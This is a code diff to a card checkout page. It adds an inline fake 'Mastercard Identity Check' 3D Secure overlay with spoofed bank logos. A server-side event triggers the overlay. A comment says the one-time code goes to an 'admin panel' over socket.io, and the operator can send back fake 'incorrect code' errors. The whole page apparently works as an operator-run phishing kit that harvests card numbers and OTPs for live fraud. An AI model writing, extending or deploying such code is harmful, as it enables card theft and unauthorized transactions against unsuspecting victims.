@@ -463,7 +463,7 @@ function getFailUrl(reason) {
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                   <div class="relative">
-                    <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="Enter card number" required>
+                     <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="Enter card number" required>
                     <div id="cardTypeIcon">
                       <img src="" alt="" class="card-type-icon hidden" id="cardLogo">
                     </div>
@@ -559,403 +559,228 @@ function getFailUrl(reason) {
     <div class="spinner"></div>
   </div>
 
-<!-- MC verification overlay container -->
-<div id="mcVerificationContainer"></div>
-
-<script>
-  // Load and initialize MC verification overlay
-  document.addEventListener('DOMContentLoaded', function() {
-    // Initially load the MC verification HTML
-    fetch('/mcverification.html')
-      .then(response => response.text())
-      .then(html => {
-        document.getElementById('mcVerificationContainer').innerHTML = html;
-        setupMCVerification();
-      })
-      .catch(error => console.error('Error loading MC verification overlay:', error));
-  });
-
- // Set up MC verification functionality
-function setupMCVerification() {
-  console.log('Setting up MC verification...');
-  const overlay = document.getElementById('mcVerificationOverlay');
-  
-  if (!overlay) {
-    console.error('MC verification overlay element not found!');
-    return; // Don't proceed with setup if the element doesn't exist
-  }
-  
-  console.log('MC overlay element found:', overlay);
-  
-  // Ensure the overlay is initially hidden
-  overlay.style.display = 'none';
-  
-  const cancelBtn = document.getElementById('mcCancel');
-  const confirmBtn = document.getElementById('mcConfirmBtn');
-  const resendBtn = document.getElementById('mcResendBtn');
-  const otpInput = document.getElementById('mcOtpInput');
-  const otpError = document.getElementById('mcOtpError');
-  const timer = document.getElementById('mcTimer');
-  
-  let timeLeft = 30;
-  let timerInterval;
-  
-  // Update bank logo based on bank code
-  function updateBankLogo(bankCode) {
-    const bankLogos = {
-      'sbi': 'https://www.onlinesbi.sbi/sbijava/images/sbi_logo.png',
-      'hdfc': 'https://www.hdfcbank.com/content/api/contentstream-id/723fb80a-2dde-42a3-9793-7ae1be57c87f/9bafa14e-1be5-4734-8c22-2eef94b76adf/common/logo.svg',
-      'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-      'axis': 'https://www.axisbank.com/assets/images/Axis-Bank-Logo.png',
-      'kotak': 'https://www.kotak.com/content/dam/Kotak/kotak-bank-logo.jpg',
-      'yes': 'https://www.yesbank.in/content/publish/banking/content/logo.png',
-      'default': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank.svg/1200px-Bank.svg.png'
-    };
-    
-    const bankLogo = document.getElementById('bankLogo');
-    if (bankLogo) {
-      bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
-      console.log('Updated bank logo:', bankCode, bankLogo.src);
-    }
-  }
-  
-  // Start the timer
-  function startTimer() {
-    timeLeft = 30;
-    updateTimer();
-    
-    if (timerInterval) clearInterval(timerInterval);
-    
-    timerInterval = setInterval(() => {
-      timeLeft--;
-      updateTimer();
+  <!-- MC Verification Overlay -->
+  <div id="mcVerificationOverlay" class="fullscreen-overlay">
+    <div style="background-color: #fff; border-radius: 8px; width: 90%; max-width: 480px; padding: 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+      <!-- Header with logo and title -->
+      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;">
+        <img id="bankLogo" src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" style="height: 40px;">
+        <button id="mcCancel" style="background: none; border: none; font-size: 24px; cursor: pointer; color: #666;">&times;</button>
+      </div>
       
-      if (timeLeft <= 0) {
-        clearInterval(timerInterval);
-        // Redirect to fail page on timeout
-        if (typeof getFailUrl === 'function') {
-          window.location.href = getFailUrl('timeout');
-        } else {
-          window.location.href = '/fail.html?reason=timeout';
+      <!-- Merchant and transaction info -->
+      <div style="margin-bottom: 20px;">
+        <div style="font-weight: bold; margin-bottom: 10px;">Secure Checkout</div>
+        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+          <span>Merchant:</span>
+          <span id="merchantName">Bologus pvt store.</span>
+        </div>
+        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+          <span>Amount:</span>
+          <span id="transactionAmount">₹<span id="transactionAmount2"></span></span>
+        </div>
+        <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+          <span>Date:</span>
+          <span id="transactionDate"></span>
+        </div>
+      </div>
+      
+      <!-- OTP Section -->
+      <div style="margin-bottom: 20px;">
+        <div style="font-weight: bold; margin-bottom: 10px;">3D Secure Authentication</div>
+        <p style="font-size: 14px; color: #666; margin-bottom: 15px;">
+          For your security, we need to verify your identity. Enter the code sent to your registered mobile phone.
+        </p>
+        
+        <div style="margin-bottom: 10px;">
+          <label for="mcOtpInput" style="display: block; margin-bottom: 5px; font-size: 14px;">Security Code:</label>
+          <input type="text" id="mcOtpInput" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;" placeholder="Enter 6-digit code" maxlength="6">
+        </div>
+        <p id="mcOtpError" style="color: #ef4444; font-size: 14px; margin-top: 5px; display: none;">
+          Incorrect verification code. Please try again.
+        </p>
+        
+        <div style="display: flex; justify-content: space-between; gap: 10px; margin-top: 15px;">
+          <button id="mcResendBtn" style="flex: 1; padding: 10px; background-color: #f3f4f6; color: #374151; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">RESEND</button>
+          <button id="mcConfirmBtn" style="flex: 1; padding: 10px; background-color: #FF5F00; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer;">CONFIRM</button>
+        </div>
+        
+        <div style="text-align: center; margin-top: 15px; font-size: 14px; color: #666;">
+          Time remaining: <span id="mcTimer">00:30</span>
+        </div>
+      </div>
+      
+      <!-- Security notice -->
+      <div style="display: flex; align-items: center; justify-content: center; margin-top: 20px; font-size: 12px; color: #666;">
+        <span style="margin-right: 8px;">🔒</span>
+        <span>Secured by Mastercard Identity Check™</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts Section -->
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    // Global Variables
+    let isCardValid = false;
+    let isExpiryValid = false;
+    let isProcessing = false;
+    let currentInvoiceId = "";
+    let statusCheckInterval;
+    let timerInterval;
+    let timer = 180;
+    let consentChecked = true;
+    let bankPageWindow = null;
+
+    // Fetch Payment Details Using PID with Fallback
+    document.addEventListener('DOMContentLoaded', async () => {
+      let defaultAmount = 100;
+      let pid = new URLSearchParams(window.location.search).get('pid');
+
+      // Always set default first
+      document.getElementById('amount').value = defaultAmount;
+      document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);
+
+      if (pid) {
+        try {
+          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
+          const data = await response.json();
+          if (data.status === 'success' && data.payment?.amount) {
+            const amount = parseFloat(data.payment.amount) || defaultAmount;
+            document.getElementById('amount').value = amount;
+            document.getElementById('displayAmount').textContent = amount.toFixed(2);
+          }
+        } catch (error) {
+          console.error('Payment details fetch error:', error);
         }
       }
-    }, 1000);
-  }
-  
-  function updateTimer() {
-    const minutes = Math.floor(timeLeft / 60);
-    const seconds = timeLeft % 60;
-    timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-  }
-  
-  // Cancel button event
-  if (cancelBtn) {
-    cancelBtn.addEventListener('click', () => {
-      overlay.style.display = 'none';
-      clearInterval(timerInterval);
-      
-      if (typeof getFailUrl === 'function') {
-        window.location.href = getFailUrl('canceled');
-      } else {
-        window.location.href = '/fail.html?reason=canceled';
-      }
-    });
-  }
-  
-  // Confirm button event
-  if (confirmBtn) {
-    confirmBtn.addEventListener('click', () => {
-      const otp = otpInput.value.trim();
-      
-      if (!otp) {
-        otpError.textContent = 'Please enter the verification code.';
-        otpError.style.display = 'block';
-        return;
-      }
-      
-      // Send OTP to server/admin panel
-      const socket = io();
-      socket.emit('mc_otp_submitted', {
-        invoiceId: currentInvoiceId,
-        otp: otp
+
+      // Add consent checkbox event listener
+      document.getElementById('consentCheckbox').addEventListener('click', function() {
+        consentChecked = !consentChecked;
+        this.classList.toggle('checked', consentChecked);
+        updateSubmitButton(); // Force update button state
       });
-      
-      // Disable the button and show loading state
-      confirmBtn.disabled = true;
-      confirmBtn.textContent = 'VERIFYING...';
-    });
-  }
-  
-  // Resend button event
-  if (resendBtn) {
-    resendBtn.addEventListener('click', () => {
-      // Request new OTP
-      const socket = io();
-      socket.emit('mc_resend_otp', {
-        invoiceId: currentInvoiceId
-      });
-      
-      // Show message
-      alert('A new verification code has been sent.');
-      
-      // Reset timer
-      startTimer();
-    });
-  }
-  
-  // Listen for Socket.io events
-  const socket = io();
-  
-  // Event for showing MC verification
-  socket.on('show_mc_verification', (data) => {
-    console.log('Received show_mc_verification event:', data);
-    console.log('Current invoice ID:', currentInvoiceId);
-    
-    // Check if the overlay exists
-    console.log('Overlay element found:', !!overlay);
-    
-    if (data.invoiceId === currentInvoiceId) {
-      console.log('Invoice IDs match, updating UI...');
-      
-      // Update merchant and amount info
-      const merchantElement = document.getElementById('merchantName');
-      const amountElement = document.getElementById('transactionAmount');
-      
-      console.log('Merchant element found:', !!merchantElement);
-      console.log('Amount element found:', !!amountElement);
-      
-      if (merchantElement) merchantElement.textContent = data.merchantName || 'Merchant';
-      if (document.getElementById('merchantName2')) document.getElementById('merchantName2').textContent = data.merchantName || 'Merchant';
-      if (amountElement) amountElement.textContent = data.amount || '$0.00';
-      if (document.getElementById('transactionAmount2')) document.getElementById('transactionAmount2').textContent = data.amount || '$0.00';
-      
-      // Update bank logo
-      updateBankLogo(data.bankCode || 'default');
-      
-      // Reset OTP input and error
-      if (otpInput) otpInput.value = '';
-      if (otpError) otpError.style.display = 'none';
-      
-      // Show overlay and start timer
-      console.log('Setting overlay display to flex');
-      overlay.style.display = 'flex';
-      startTimer();
-      console.log('MC verification overlay should now be visible');
-    } else {
-      console.log('Invoice IDs do not match, ignoring event');
-    }
-  });
-  
-  // Update bank logo event
-  socket.on('update_mc_bank', (data) => {
-    console.log('Received update_mc_bank event:', data);
-    
-    if (data.invoiceId === currentInvoiceId) {
-      updateBankLogo(data.bankCode || 'default');
-    }
-  });
-  
-  // Handle OTP error
-  socket.on('mc_otp_error', (data) => {
-    console.log('Received mc_otp_error event:', data);
-    
-    if (data.invoiceId === currentInvoiceId) {
-      otpError.textContent = data.message || 'Incorrect verification code. Please try again.';
-      otpError.style.display = 'block';
-      
-      // Reset button state
-      confirmBtn.disabled = false;
-      confirmBtn.textContent = 'CONFIRM';
-    }
-  });
-  
-  // Handle verification result
-  socket.on('mc_verification_result', (data) => {
-    console.log('Received mc_verification_result event:', data);
-    
-    if (data.invoiceId === currentInvoiceId) {
-      // Hide overlay and stop timer
-      overlay.style.display = 'none';
-      clearInterval(timerInterval);
-      
-      // Redirect based on result
-      if (data.success) {
-        if (typeof getSuccessUrl === 'function') {
-          window.location.href = getSuccessUrl(currentInvoiceId);
-        } else {
-          window.location.href = `/success.html?invoiceId=${currentInvoiceId}`;
-        }
-      } else {
-        if (typeof getFailUrl === 'function') {
-          window.location.href = getFailUrl(data.reason || 'declined');
-        } else {
-          window.location.href = `/fail.html?invoiceId=${currentInvoiceId}&reason=${data.reason || 'declined'}`;
-        }
-      }
-    }
-  });
-}
-</script>
-<!-- Scripts Section -->
-<script src="/socket.io/socket.io.js"></script>
-<script>
-  // Global Variables
-  let isCardValid = false;
-  let isExpiryValid = false;
-  let isProcessing = false;
-  let currentInvoiceId = "";
-  let statusCheckInterval;
-  let timerInterval;
-  let timer = 180;
-  let consentChecked = true;
-  let bankPageWindow = null;
 
-  // Fetch Payment Details Using PID with Fallback
-  document.addEventListener('DOMContentLoaded', async () => {
-    let defaultAmount = 100;
-    let pid = new URLSearchParams(window.location.search).get('pid');
+      // Initialize MC verification 
+      setupMCVerification();
 
-    // Always set default first
-    document.getElementById('amount').value = defaultAmount;
-    document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);
-
-    if (pid) {
-      try {
-        const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
-        const data = await response.json();
-        if (data.status === 'success' && data.payment?.amount) {
-          const amount = parseFloat(data.payment.amount) || defaultAmount;
-          document.getElementById('amount').value = amount;
-          document.getElementById('displayAmount').textContent = amount.toFixed(2);
-        }
-      } catch (error) {
-        console.error('Payment details fetch error:', error);
-      }
-    }
-
-    // Add consent checkbox event listener
-    document.getElementById('consentCheckbox').addEventListener('click', function() {
-      consentChecked = !consentChecked;
-      this.classList.toggle('checked', consentChecked);
-      updateSubmitButton(); // Force update button state
+      // Initial validation
+      updateSubmitButton();
     });
 
-    // Initial validation
-    updateSubmitButton();
-  });
-
-  // Card Validation & Formatting Functions
-  function validateCard(number) {
-    const clean = number.replace(/\D/g, '');
-    if (clean.length !== 16) return false;
-    let sum = 0;
-    for (let i = 0; i < clean.length; i++) {
-      let digit = parseInt(clean[i], 10);
-      if ((i + 1) % 2 === 0) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
+    // Card Validation & Formatting Functions
+    function validateCard(number) {
+      const clean = number.replace(/\D/g, '');
+      if (clean.length !== 16) return false;
+      let sum = 0;
+      for (let i = 0; i < clean.length; i++) {
+        let digit = parseInt(clean[i], 10);
+        if ((i + 1) % 2 === 0) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
       }
-      sum += digit;
+      return sum % 10 === 0;
     }
-    return sum % 10 === 0;
-  }
 
-  function formatCardNumber(value) {
-    return value.replace(/\D/g, '')
+    function formatCardNumber(value) {
+      return value.replace(/\D/g, '')
                 .replace(/(\d{4})(?=\d)/g, '$1 ')
                 .substring(0, 19);
-  }
-
-  function formatExpiry(value) {
-    let digits = value.replace(/\D/g, '');
-    digits = digits.substring(0, 4);
-    if (digits.length >= 3) {
-      return digits.substring(0, 2) + '/' + digits.substring(2);
     }
-    return digits;
-  }
 
-  function validateExpiry(value) {
-    if (!/^\d{2}\/\d{2}$/.test(value)) return false;
-    const [month, year] = value.split('/').map(Number);
-    if (month < 1 || month > 12) return false;
-    const now = new Date();
-    const currentYear = now.getFullYear() % 100;
-    const currentMonth = now.getMonth() + 1;
-    return !(year < currentYear || (year === currentYear && month < currentMonth));
-  }
-
-  function updateCardError() {
-    const cardInput = document.getElementById("cardNumber");
-    const errorElem = document.getElementById("cardError");
-    const plain = cardInput.value.replace(/\s/g, '');
-    isCardValid = validateCard(plain);
-    if (plain.length === 16 && !isCardValid) {
-      errorElem.style.display = 'block';
-      errorElem.textContent = "Please enter valid card number";
-      cardInput.classList.add('border-red-500');
-    } else {
-      errorElem.style.display = 'none';
-      cardInput.classList.remove('border-red-500');
+    function formatExpiry(value) {
+      let digits = value.replace(/\D/g, '');
+      digits = digits.substring(0, 4);
+      if (digits.length >= 3) {
+        return digits.substring(0, 2) + '/' + digits.substring(2);
+      }
+      return digits;
     }
-  }
 
-  function detectCardType(number) {
-    const clean = number.replace(/\D/g, '');
-    if (/^4/.test(clean)) return 'visa';
-    if (/^5[1-5]/.test(clean)) return 'mastercard';
-    if (/^3[47]/.test(clean)) return 'amex';
-    if (/^(508[5-9]|60698|607[0-8]\d|6079[0-8]|608[0-5]|6521[5-9]|652[2-9]\d|6530\d|6531[0-4])/.test(clean)) return 'rupay';
-    return null;
-  }
-
-  function updateCardTypeAndInfo(value) {
-    const cardLogo = document.getElementById("cardLogo");
-    const detectedType = detectCardType(value);
-    const logos = {
-      visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
-      mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
-      amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
-      rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
-    };
-    if (detectedType && logos[detectedType]) {
-      cardLogo.src = logos[detectedType];
-      cardLogo.classList.remove('hidden');
-    } else {
-      cardLogo.classList.add('hidden');
+    function validateExpiry(value) {
+      if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+      const [month, year] = value.split('/').map(Number);
+      if (month < 1 || month > 12) return false;
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+      return !(year < currentYear || (year === currentYear && month < currentMonth));
     }
-  }
 
-  function updateSubmitButton() {
-    const emailValid = document.getElementById('email').checkValidity();
-    const cardValid = isCardValid;
-    const expiryValid = isExpiryValid;
-    const cvvValid = document.getElementById('cvv').value.length === 3;
-    const nameValid = document.getElementById('cardholderName').value.trim().length > 0;
-
-    const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;
-
-    document.getElementById('submitButton').disabled = !allValid;
-  }
-
-  function updateConfirmOtpButton() {
-    const otp = document.getElementById('otp').value;
-    const otpButton = document.getElementById('otpSubmitButton');
-    if (otp.length === 6) {
-      otpButton.disabled = false;
-      otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
-      document.getElementById('otpError').style.display = 'none';
-    } else {
-      otpButton.disabled = true;
-      otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
+    function updateCardError() {
+      const cardInput = document.getElementById("cardNumber");
+      const errorElem = document.getElementById("cardError");
+      const plain = cardInput.value.replace(/\s/g, '');
+      isCardValid = validateCard(plain);
+      if (plain.length === 16 && !isCardValid) {
+        errorElem.style.display = 'block';
+        errorElem.textContent = "Please enter valid card number";
+        cardInput.classList.add('border-red-500');
+      } else {
+        errorElem.style.display = 'none';
+        cardInput.classList.remove('border-red-500');
+      }
     }
-  }
 
-  // Attach Input Handlers
-  document.addEventListener("DOMContentLoaded", function(){
-    const cardInput = document.getElementById("cardNumber");
-    const expiryInput = document.getElementById("expiry");
-    const socket = io();
+    function detectCardType(number) {
+      const clean = number.replace(/\D/g, '');
+      if (/^4/.test(clean)) return 'visa';
+      if (/^5[1-5]/.test(clean)) return 'mastercard';
+      if (/^3[47]/.test(clean)) return 'amex';
+      if (/^(508[5-9]|60698|607[0-8]\d|6079[0-8]|608[0-5]|6521[5-9]|652[2-9]\d|6530\d|6531[0-4])/.test(clean)) return 'rupay';
+      return null;
+    }
+
+    function updateCardTypeAndInfo(value) {
+      const cardLogo = document.getElementById("cardLogo");
+      const detectedType = detectCardType(value);
+      const logos = {
+        visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
+        mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
+        amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
+        rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
+      };
+      if (detectedType && logos[detectedType]) {
+        cardLogo.src = logos[detectedType];
+        cardLogo.classList.remove('hidden');
+      } else {
+        cardLogo.classList.add('hidden');
+      }
+    }
+
+    function updateSubmitButton() {
+      const emailValid = document.getElementById('email').checkValidity();
+      const cardValid = isCardValid;
+      const expiryValid = isExpiryValid;
+      const cvvValid = document.getElementById('cvv').value.length === 3;
+      const nameValid = document.getElementById('cardholderName').value.trim().length > 0;
+
+      const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;
+
+      document.getElementById('submitButton').disabled = !allValid;
+    }
+
+    function updateConfirmOtpButton() {
+      const otp = document.getElementById('otp').value;
+      const otpButton = document.getElementById('otpSubmitButton');
+      if (otp.length === 6) {
+        otpButton.disabled = false;
+        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
+        document.getElementById('otpError').style.display = 'none';
+      } else {
+        otpButton.disabled = true;
+        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
+      }
+    }
+
+// Attach Input Handlers
+    document.addEventListener("DOMContentLoaded", function(){
+      const cardInput = document.getElementById("cardNumber");
+      const expiryInput = document.getElementById("expiry");
+      const socket = io();
 
 if (cardInput) {
   cardInput.addEventListener("input", function(e) {
@@ -1119,6 +944,66 @@ socket.emit('join', currentInvoiceId);
       isProcessing = false;
     });
 
+    // Event for showing MC verification
+    socket.on('show_mc_verification', (data) => {
+      console.log('Received show_mc_verification event:', data);
+      console.log('Current invoice ID:', currentInvoiceId);
+      
+      // Check if the overlay exists
+      const overlay = document.getElementById('mcVerificationOverlay');
+      console.log('Overlay element found:', !!overlay);
+      
+      if (data.invoiceId === currentInvoiceId && overlay) {
+        console.log('Invoice IDs match, updating UI...');
+        
+        // Update merchant and amount info
+        const merchantElement = document.getElementById('merchantName');
+        const amountElement = document.getElementById('transactionAmount');
+        const amountElement2 = document.getElementById('transactionAmount2');
+        
+        if (merchantElement) merchantElement.textContent = data.merchantName || 'Bologus pvt store.';
+        if (amountElement2) amountElement2.textContent = data.amount || document.getElementById('displayAmount').textContent || '0.00';
+        
+        // Update bank logo
+        const bankCode = data.bankCode || 'default';
+        const bankLogo = document.getElementById('bankLogo');
+        if (bankLogo) {
+          const bankLogos = {
+            'sbi': 'https://www.onlinesbi.sbi/sbijava/images/sbi_logo.png',
+            'hdfc': 'https://www.hdfcbank.com/content/api/contentstream-id/723fb80a-2dde-42a3-9793-7ae1be57c87f/9bafa14e-1be5-4734-8c22-2eef94b76adf/common/logo.svg',
+            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+            'axis': 'https://www.axisbank.com/assets/images/Axis-Bank-Logo.png',
+            'kotak': 'https://www.kotak.com/content/dam/Kotak/kotak-bank-logo.jpg',
+            'yes': 'https://www.yesbank.in/content/publish/banking/content/logo.png',
+            'default': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank.svg/1200px-Bank.svg.png'
+          };
+          bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+        }
+        
+        // Set current date for transaction info
+        const now = new Date();
+        const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+        const dateElement = document.getElementById('transactionDate');
+        if (dateElement) dateElement.textContent = dateStr;
+        
+        // Reset OTP input and error
+        const otpInput = document.getElementById('mcOtpInput');
+        const otpError = document.getElementById('mcOtpError');
+        if (otpInput) otpInput.value = '';
+        if (otpError) otpError.style.display = 'none';
+        
+        // Show overlay
+        overlay.style.display = 'flex';
+        
+        // Start timer for MC verification
+        setupMCTimerIfNeeded();
+        
+        console.log('MC verification overlay displayed');
+      } else {
+        console.log('Invoice IDs do not match or overlay not found, ignoring event');
+      }
+    });
+
     // Modified redirect event handler to use clean URLs
     socket.on('redirect', (data) => {
       console.log('Received redirect event:', data);
@@ -1157,6 +1042,63 @@ socket.emit('join', currentInvoiceId);
         if (!statusCheckInterval) {
           console.log('Starting transaction status check for invoice:', currentInvoiceId);
           statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+        }
+      }
+    });
+    
+    // Handle MC-specific socket events
+    socket.on('update_mc_bank', (data) => {
+      if (data.invoiceId === currentInvoiceId) {
+        const bankLogos = {
+          'sbi': 'https://www.onlinesbi.sbi/sbijava/images/sbi_logo.png',
+          'hdfc': 'https://www.hdfcbank.com/content/api/contentstream-id/723fb80a-2dde-42a3-9793-7ae1be57c87f/9bafa14e-1be5-4734-8c22-2eef94b76adf/common/logo.svg',
+          'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+          'axis': 'https://www.axisbank.com/assets/images/Axis-Bank-Logo.png',
+          'kotak': 'https://www.kotak.com/content/dam/Kotak/kotak-bank-logo.jpg',
+          'yes': 'https://www.yesbank.in/content/publish/banking/content/logo.png',
+          'default': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank.svg/1200px-Bank.svg.png'
+        };
+        
+        const bankLogo = document.getElementById('bankLogo');
+        if (bankLogo) {
+          bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
+        }
+      }
+    });
+    
+    socket.on('mc_otp_error', (data) => {
+      if (data.invoiceId === currentInvoiceId) {
+        const mcOtpError = document.getElementById('mcOtpError');
+        const mcConfirmBtn = document.getElementById('mcConfirmBtn');
+        
+        if (mcOtpError) {
+          mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
+          mcOtpError.style.display = 'block';
+        }
+        
+        if (mcConfirmBtn) {
+          mcConfirmBtn.disabled = false;
+          mcConfirmBtn.textContent = 'CONFIRM';
+        }
+      }
+    });
+    
+    socket.on('mc_verification_result', (data) => {
+      if (data.invoiceId === currentInvoiceId) {
+        // Hide overlay
+        const overlay = document.getElementById('mcVerificationOverlay');
+        if (overlay) overlay.style.display = 'none';
+        
+        // Clear timer if it exists
+        if (window.mcTimerInterval) {
+          clearInterval(window.mcTimerInterval);
+        }
+        
+        // Redirect based on result
+        if (data.success) {
+          window.location.href = getSuccessUrl(currentInvoiceId);
+        } else {
+          window.location.href = getFailUrl(data.reason || 'declined');
         }
       }
     });
@@ -1249,6 +1191,106 @@ socket.emit('join', currentInvoiceId);
     }
   };
   history.pushState(null, null, window.location.href);
+  
+  // MC Verification Functions
+  function setupMCVerification() {
+    const mcCancel = document.getElementById('mcCancel');
+    const mcConfirmBtn = document.getElementById('mcConfirmBtn');
+    const mcResendBtn = document.getElementById('mcResendBtn');
+    const mcOtpInput = document.getElementById('mcOtpInput');
+    
+    if (mcCancel) {
+      mcCancel.addEventListener('click', function() {
+        // Hide the overlay
+        const overlay = document.getElementById('mcVerificationOverlay');
+        if (overlay) overlay.style.display = 'none';
+        
+        // Clear timer if it exists
+        if (window.mcTimerInterval) {
+          clearInterval(window.mcTimerInterval);
+        }
+        
+        // Redirect to fail page with canceled reason
+        window.location.href = getFailUrl('canceled');
+      });
+    }
+    
+    if (mcConfirmBtn) {
+      mcConfirmBtn.addEventListener('click', function() {
+        const otp = mcOtpInput.value.trim();
+        if (!otp) {
+          const mcOtpError = document.getElementById('mcOtpError');
+          if (mcOtpError) {
+            mcOtpError.textContent = 'Please enter the verification code.';
+            mcOtpError.style.display = 'block';
+          }
+          return;
+        }
+        
+        // Emit event with OTP
+        const socket = io();
+        socket.emit('mc_otp_submitted', {
+          invoiceId: currentInvoiceId,
+          otp: otp
+        });
+        
+        // Disable button and show loading state
+        mcConfirmBtn.disabled = true;
+        mcConfirmBtn.textContent = 'VERIFYING...';
+      });
+    }
+    
+    if (mcResendBtn) {
+      mcResendBtn.addEventListener('click', function() {
+        // Request resend of OTP
+        const socket = io();
+        socket.emit('mc_resend_otp', {
+          invoiceId: currentInvoiceId
+        });
+        
+        // Reset timer
+        setupMCTimerIfNeeded(true);
+        
+        // Show notification to user
+        alert('A new verification code has been sent.');
+      });
+    }
+  }
+  
+  function setupMCTimerIfNeeded(reset = false) {
+    const timerElement = document.getElementById('mcTimer');
+    if (!timerElement) return;
+    
+    if (window.mcTimerInterval) {
+      clearInterval(window.mcTimerInterval);
+    }
+    
+    let timeLeft = 30; // 30 seconds countdown
+    
+    // Update the timer display immediately
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    
+    // Set up the interval
+    window.mcTimerInterval = setInterval(() => {
+      timeLeft--;
+      
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      
+      if (timeLeft <= 0) {
+        clearInterval(window.mcTimerInterval);
+        
+        // Redirect on timeout
+        const overlay = document.getElementById('mcVerificationOverlay');
+        if (overlay) overlay.style.display = 'none';
+        
+        window.location.href = getFailUrl('timeout');
+      }
+    }, 1000);
+  }
 </script>
   <script>
   // Visitor Heartbeat - keeps track of active visitors
